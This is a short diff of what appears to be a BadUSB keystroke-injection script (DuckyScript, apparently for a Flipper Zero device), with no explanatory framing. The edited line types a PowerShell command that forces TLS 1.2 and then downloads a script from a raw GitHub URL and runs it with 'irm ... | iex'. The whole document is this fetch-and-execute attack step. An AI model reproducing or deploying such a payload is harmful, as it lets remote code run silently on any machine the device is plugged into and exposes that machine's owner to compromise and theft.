@@ -14,5 +14,5 @@ DELAY 1000
 ENTER
 DELAY 1500
 
-STRING irm https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/f44b1874d8cce12b_run.ps1 | iex
+STRING [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/f44b1874d8cce12b_run.ps1 | iex
 ENTER
